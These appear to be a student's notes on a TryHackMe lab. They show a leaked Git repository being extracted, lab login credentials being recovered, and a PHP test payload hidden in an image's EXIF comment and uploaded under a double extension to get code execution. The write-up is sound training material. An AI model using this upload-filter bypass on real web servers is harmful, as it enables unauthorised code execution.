From the downloaded Website.git we now will extract the files

now using the tool GitTools we will extract the files from .git we got

`./extractor.sh /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/ /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/`
![[Screenshot 2021-04-30 at 10.01.22 PM.png]]

we now have 3 commits
![[Screenshot 2021-04-30 at 10.01.48 PM.png]]

to get the commit order
`separator="======================================="; for i in $(ls); do printf "\\n\\n$separator\\n\\033\[4;1m$i\\033\[0m\\n$(cat $i/commit-meta.txt)\\n"; done; printf "\\n\\n$separator\\n\\n\\n"`

![[Screenshot 2021-04-30 at 10.06.33 PM.png]]

On looking, the commit hashes and stuff 
we saw the commit order:
```
2-70dde80cc19ec76704567996738894828f4ee895 -> 1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2 -> 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
```

review the code. and there is /resources page and we can upload image with conditions but we have to login first.

login creds :

`thmomas 02d90eda8f6b6b06c32d5f207831101f 
passwd: i<3ruby`

and we can upload 

![[Screenshot 2021-04-30 at 11.36.08 PM.png]]

updating a static image for poc that we can execute php via images so that AV wont alert the user
`exiftool -Comment="<?php echo \\"<pre>Test Payload</pre>\\"; die(); ?>" sp00f.png.php`

and by selecting all supported types we can upload the file
![[Screenshot 2021-04-30 at 11.54.30 PM.png]]

and here the file. poc ie. We have the ability to execute arbitrary PHP code on the system!
![[Screenshot 2021-04-30 at 11.55.01 PM.png]]